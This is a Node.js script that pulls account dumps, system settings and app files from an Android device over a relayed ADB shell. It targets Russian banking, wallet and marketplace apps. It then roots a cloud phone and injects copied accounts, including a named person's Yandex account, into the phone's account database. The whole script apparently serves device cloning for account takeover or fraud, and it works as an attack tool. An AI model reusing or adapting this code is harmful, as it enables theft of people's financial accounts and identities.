#!/usr/bin/env node
/**
 * Final extraction + injection strategy:
 * 1. Extract max possible from .220 as shell (account data, content providers, settings)
 * 2. Extract accounts_ce.db from D1 as reference for structure
 * 3. On D2 (root): create accounts, inject data, restore state
 */
const net = require('net');
const https = require('https');
const crypto = require('crypto');
const fs = require('fs');
const path = require('path');

const { AK, SK, HOST, D1, D2, CT, SHD } = require('../shared/vmos_api');
const SRC_IP = '10.0.26.220';
const OUT = path.join(__dirname, '..', 'output', 'clone_220_data');

const APPS = [
  'com.yandex.bank', 'ru.ozon.app.android', 'ru.ozon.fintech.finance',
  'com.wildberries.ru', 'ru.yandex.taxi', 'ru.yoo.money',
  'ru.cupis.wallet', 'ru.apteka', 'ru.getpharma.eapteka',
  'ru.rostel', 'ru.vk.store', 'com.app.trademo', 'com.trademo.massmo',
];

function sign(b) {
  const xd = new Date().toISOString().replace(/[-:]/g, '').replace(/\.\d{3}Z$/, 'Z');
  const sd = xd.slice(0, 8), CT = 'application/json;charset=UTF-8', SHD = 'content-type;host;x-content-sha256;x-date';
  const bh = crypto.createHash('sha256').update(b, 'utf8').digest('hex');
  const can = `host:${HOST}\nx-date:${xd}\ncontent-type:${CT}\nsignedHeaders:${SHD}\nx-content-sha256:${bh}`;
  const ch = crypto.createHash('sha256').update(can, 'utf8').digest('hex');
  const sts = `HMAC-SHA256\n${xd}\n${sd}/armcloud-paas/request\n${ch}`;
  let k = crypto.createHmac('sha256', SK).update(sd).digest();
  k = crypto.createHmac('sha256', k).update('armcloud-paas').digest();
  k = crypto.createHmac('sha256', k).update('request').digest();
  return { 'content-type': CT, 'x-date': xd, 'x-host': HOST, 'authorization': `HMAC-SHA256 Credential=${AK}, SignedHeaders=${SHD}, Signature=${crypto.createHmac('sha256', k).update(sts).digest('hex')}` };
}
function apiPost(ep, d, t) {
  return new Promise(ok => {
    const b = JSON.stringify(d || {}); const h = sign(b); const buf = Buffer.from(b);
    const req = https.request({ hostname: HOST, path: ep, method: 'POST', headers: { ...h, 'content-length': buf.length }, timeout: (t || 60) * 1000 }, res => {
      let r = ''; res.on('data', c => r += c); res.on('end', () => { try { ok(JSON.parse(r)); } catch { ok({ code: -1 }); } });
    });
    req.on('timeout', () => { req.destroy(); ok({ code: -99 }); });
    req.on('error', e => ok({ code: -99, msg: e.message }));
    req.write(buf); req.end();
  });
}

// ADB stream to .220
const A_CNXN=0x4e584e43,A_OPEN=0x4e45504f,A_OKAY=0x59414b4f,A_WRTE=0x45545257,A_CLSE=0x45534c43;
function makeHeader(cmd,a0,a1,dl,dc){const h=Buffer.alloc(24);h.writeUInt32LE(cmd,0);h.writeUInt32LE(a0,4);h.writeUInt32LE(a1,8);h.writeUInt32LE(dl,12);h.writeUInt32LE(dc,16);h.writeUInt32LE((cmd^0xFFFFFFFF)>>>0,20);return h;}
function crc(d){let s=0;for(let i=0;i<d.length;i++)s+=d[i];return s>>>0;}
function makeCnxn(){const p=Buffer.from('host::\x00');return Buffer.concat([makeHeader(A_CNXN,0x01000000,256*1024,p.length,crc(p)),p]);}
function makeOpen(lid,svc){const p=Buffer.from(svc+'\x00');return Buffer.concat([makeHeader(A_OPEN,lid,0,p.length,crc(p)),p]);}
function makeOkay(lid,rid){return makeHeader(A_OKAY,lid,rid,0,0);}
function parsePackets(buf){const pkts=[];let o=0;while(o+24<=buf.length){const cmd=buf.readUInt32LE(o),a0=buf.readUInt32LE(o+4),a1=buf.readUInt32LE(o+8),dl=buf.readUInt32LE(o+12);if(o+24+dl>buf.length)break;pkts.push({cmd,arg0:a0,arg1:a1,data:buf.slice(o+24,o+24+dl)});o+=24+dl;}return{packets:pkts,remaining:buf.slice(o)};}

function adbExec220(cmd, sec) {
  return new Promise(resolve => {
    let trid=null,srid=null,sc=false,done=false,res=Buffer.alloc(0),buf=Buffer.alloc(0),tb=Buffer.alloc(0);
    const sock=net.createConnection(8479,'127.0.0.1',()=>sock.write(makeCnxn()));
    const fin=()=>{if(done)return;done=true;clearTimeout(t);try{sock.destroy();}catch(e){}resolve(res.toString());};
    const t=setTimeout(fin,(sec||30)*1000);
    sock.on('data',chunk=>{buf=Buffer.concat([buf,chunk]);const{packets:pp,remaining:r}=parsePackets(buf);buf=r;
    for(const p of pp){if(p.cmd===A_CNXN&&!trid)sock.write(makeOpen(1,`exec:nc ${SRC_IP} 5555`));
    else if(p.cmd===A_OKAY&&p.arg1===1&&!trid){trid=p.arg0;setTimeout(()=>{const c=makeCnxn();sock.write(Buffer.concat([makeHeader(A_WRTE,1,trid,c.length,crc(c)),c]));},500);}
    else if(p.cmd===A_WRTE&&p.arg1===1){sock.write(makeOkay(1,trid));tb=Buffer.concat([tb,p.data]);const inner=parsePackets(tb);tb=inner.remaining;
    for(const ip of inner.packets){if(ip.cmd===A_CNXN&&!sc){sc=true;const q=Buffer.from('shell:'+cmd+'\x00');const op=Buffer.concat([makeHeader(A_OPEN,100,0,q.length,crc(q)),q]);sock.write(Buffer.concat([makeHeader(A_WRTE,1,trid,op.length,crc(op)),op]));}
    else if(ip.cmd===A_OKAY&&ip.arg1===100)srid=ip.arg0;
    else if(ip.cmd===A_WRTE&&ip.arg1===100){res=Buffer.concat([res,ip.data]);const ok=makeOkay(100,srid);sock.write(Buffer.concat([makeHeader(A_WRTE,1,trid,ok.length,crc(ok)),ok]));}
    else if(ip.cmd===A_CLSE)fin();}}else if(p.cmd===A_CLSE)fin();}});
    sock.on('error',fin);sock.on('close',fin);
  });
}

const log = m => console.log(`[${new Date().toISOString().slice(11,19)}] ${m}`);
const sleep = ms => new Promise(r => setTimeout(r, ms));

async function main() {
  console.log('═'.repeat(60));
  console.log('  FINAL EXTRACT (.220) + INJECT (D2)');
  console.log('═'.repeat(60));
  fs.mkdirSync(path.join(OUT, 'app_data'), { recursive: true });

  // ══════════════════════════════════════════════
  // PHASE 1: EXTRACT FROM .220 (as shell)
  // ══════════════════════════════════════════════
  log('\n▶ PHASE 1: Extract from .220');

  // 1a. Full account dump with all details
  log('\n[1a] Full account dump...');
  const accDump = await adbExec220('dumpsys account 2>&1', 30);
  fs.writeFileSync(path.join(OUT, 'app_data', 'dumpsys_account_full.txt'), accDump);
  log('  Saved: ' + accDump.length + ' bytes');

  // 1b. Account authenticator details
  log('[1b] Account authenticators...');
  const authDump = await adbExec220('dumpsys account 2>&1 | grep -A5 "ServiceInfo"', 15);
  log('  ' + authDump.slice(0, 300));

  // 1c. All settings that apps might rely on
  log('[1c] Settings extraction...');
  const settings = await adbExec220('settings list secure 2>/dev/null; echo "===GLOBAL==="; settings list global 2>/dev/null; echo "===SYSTEM==="; settings list system 2>/dev/null', 20);
  fs.writeFileSync(path.join(OUT, 'app_data', 'settings_all.txt'), settings);
  log('  Settings: ' + settings.length + ' bytes');

  // 1d. App-specific external storage files
  log('[1d] External app storage...');
  for (const pkg of APPS) {
    const extData = await adbExec220(`ls -la /sdcard/Android/data/${pkg}/ 2>/dev/null | head -5`, 8);
    if (extData.length > 10 && !extData.includes('No such file')) {
      log(`  ${pkg}: ${extData.trim().split('\n').length} files`);
    }
  }

  // 1e. Shared storage (DCIM, Downloads, etc)
  log('[1e] Shared storage...');
  const shared = await adbExec220('ls /sdcard/ 2>/dev/null | head -20', 10);
  log('  /sdcard: ' + shared.replace(/\n/g, ', '));

  // ══════════════════════════════════════════════
  // PHASE 2: D2 ROOT — Extract accounts_ce.db structure + inject accounts
  // ══════════════════════════════════════════════
  log('\n▶ PHASE 2: Inject accounts into D2 (root)');

  // 2a. Ensure root on D2
  await apiPost('/vcpcloud/api/padApi/switchRoot', { padCodes: [D2], rootStatus: 1, rootType: 1, packageName: 'com.android.shell' });
  await sleep(2000);
  const rootCheck = await syncCmd(D2, 'id', 10);
  log('D2 root: ' + rootCheck.split('\n')[0]);

  // 2b. Check current D2 accounts
  log('\n[2b] D2 current accounts...');
  const d2acc = await syncCmd(D2, 'dumpsys account 2>&1 | head -15', 10);
  log(d2acc);

  // 2c. Extract D2's current accounts_ce.db (as reference)
  log('\n[2c] D2 accounts_ce.db backup...');
  const d2accDb = await syncCmd(D2, 'base64 /data/system_ce/0/accounts_ce.db 2>/dev/null', 30);
  if (d2accDb.length > 100) {
    fs.writeFileSync(path.join(OUT, 'app_data', 'd2_accounts_ce_backup.db'),
      Buffer.from(d2accDb.replace(/\s/g, ''), 'base64'));
    log('  D2 accounts_ce.db backed up');
  }

  // 2d. Check accounts_ce.db schema on D2
  log('\n[2d] D2 accounts_ce.db schema...');
  const schema = await syncCmd(D2, 'sqlite3 /data/system_ce/0/accounts_ce.db ".schema" 2>&1', 15);
  log(schema.slice(0, 500));

  // 2e. Check existing accounts
  const existingAccs = await syncCmd(D2, 'sqlite3 /data/system_ce/0/accounts_ce.db "SELECT _id, name, type FROM accounts;" 2>&1', 10);
  log('Existing accounts: ' + existingAccs);

  // 2f. Create accounts matching .220
  log('\n[2f] Creating accounts on D2...');
  
  // Insert OZON ID account
  const insertOzon = await syncCmd(D2, `sqlite3 /data/system_ce/0/accounts_ce.db "INSERT OR IGNORE INTO accounts (name, type, previous_name) VALUES ('OZON ID', 'ru.ozon.id.authorized.account', '');" 2>&1; echo DONE`, 10);
  log('  OZON ID insert: ' + insertOzon);

  // Insert Yandex Passport account
  const insertYandex = await syncCmd(D2, `sqlite3 /data/system_ce/0/accounts_ce.db "INSERT OR IGNORE INTO accounts (name, type, previous_name) VALUES ('Максим Сирож #2042295278 ﹫', 'com.yandex.passport', '');" 2>&1; echo DONE`, 10);
  log('  Yandex insert: ' + insertYandex);

  // Fix permissions
  await syncCmd(D2, 'chmod 600 /data/system_ce/0/accounts_ce.db; chown system:system /data/system_ce/0/accounts_ce.db', 10);

  // Verify
  const verifyAccs = await syncCmd(D2, 'sqlite3 /data/system_ce/0/accounts_ce.db "SELECT _id, name, type FROM accounts;" 2>&1', 10);
  log('  Accounts after insert: ' + verifyAccs);

  // ══════════════════════════════════════════════
  // PHASE 3: D2 ROOT — Create app data directories + inject settings
  // ══════════════════════════════════════════════
  log('\n▶ PHASE 3: Inject app data dirs + settings on D2');

  // 3a. Ensure shared_prefs and databases dirs exist for all apps
  for (const pkg of APPS) {
    await syncCmd(D2, `mkdir -p /data/data/${pkg}/databases /data/data/${pkg}/shared_prefs 2>/dev/null`, 5);
  }
  log('  App dirs created');

  // 3b. Copy .220's system settings to D2
  log('\n[3b] Copying key settings...');
  const settingsFile = path.join(OUT, 'app_data', 'settings_all.txt');
  if (fs.existsSync(settingsFile)) {
    const settingsData = fs.readFileSync(settingsFile, 'utf8');
    // Extract key settings that apps might rely on
    const keySettings = settingsData.split('\n').filter(l => 
      l.includes('android_id') || l.includes('bluetooth_name') || 
      l.includes('device_name') || l.includes('lock_screen') ||
      l.includes('install_non_market_apps')
    );
    for (const setting of keySettings) {
      const [key, val] = setting.split('=');
      if (key && val) {
        const ns = setting.includes('===GLOBAL===') ? 'global' : 
                   setting.includes('===SYSTEM===') ? 'system' : 'secure';
        // android_id already set, skip
        if (key.trim() === 'android_id') continue;
        await syncCmd(D2, `settings put ${ns} "${key.trim()}" "${val.trim()}" 2>/dev/null`, 5);
      }
    }
    log('  Key settings copied');
  }

  // ══════════════════════════════════════════════
  // PHASE 4: Try extracting app data via accessible paths on .220
  // ══════════════════════════════════════════════
  log('\n▶ PHASE 4: Extract accessible app data from .220');

  // 4a. External storage data (readable by shell)
  for (const pkg of APPS) {
    const extFiles = await adbExec220(`find /sdcard/Android/data/${pkg} -type f 2>/dev/null | head -20`, 10);
    if (extFiles.trim().length > 0) {
      log(`\n  ${pkg} external files:`);
      const files = extFiles.trim().split('\n');
      const pkgDir = path.join(OUT, 'app_data', pkg);
      fs.mkdirSync(pkgDir, { recursive: true });
      
      for (const f of files.slice(0, 10)) {
        if (!f.trim()) continue;
        const size = await adbExec220(`wc -c < "${f.trim()}" 2>/dev/null`, 5);
        const fileSize = parseInt(size) || 0;
        if (fileSize > 0 && fileSize < 2000000) {
          const b64 = await adbExec220(`base64 "${f.trim()}" 2>/dev/null`, 30);
          if (b64.length > 10) {
            const fname = path.basename(f.trim());
            fs.writeFileSync(path.join(pkgDir, 'ext_' + fname),
              Buffer.from(b64.replace(/\s/g, ''), 'base64'));
            log(`    ✓ ${fname}: ${fileSize} bytes`);
          }
        }
      }
    }
  }

  // 4b. Try reading app cache dirs (sometimes accessible)
  log('\n[4b] App cache scan...');
  for (const pkg of APPS.slice(0, 5)) {
    const cache = await adbExec220(`ls /data/data/${pkg}/cache/ 2>/dev/null | head -3`, 8);
    if (cache.length > 0 && !cache.includes('Permission denied')) {
      log(`  ${pkg} cache: ${cache.trim()}`);
    }
  }

  // ══════════════════════════════════════════════
  // PHASE 5: Verification
  // ══════════════════════════════════════════════
  log('\n▶ PHASE 5: Verify D2 state');

  const d2verify = await syncCmd(D2, [
    'echo "=== ACCOUNTS ==="',
    'dumpsys account 2>&1 | head -10',
    'echo "=== IDENTITY ==="',
    'getprop persist.sys.cloud.imeinum',
    'getprop persist.sys.cloud.phonenum',
    'settings get secure android_id',
    'echo "=== APPS ==="',
    'pm list packages -3 2>/dev/null | wc -l',
    'echo "=== DB FILES ==="',
    'ls /data/system_ce/0/accounts_ce.db 2>/dev/null',
    'sqlite3 /data/system_ce/0/accounts_ce.db "SELECT name,type FROM accounts;" 2>/dev/null',
  ].join('; '), 20);
  log(d2verify);

  log('\n═══════════════════════════════════════');
  log('  DONE');
  log('═══════════════════════════════════════');
}

main().catch(e => console.error('FATAL:', e));
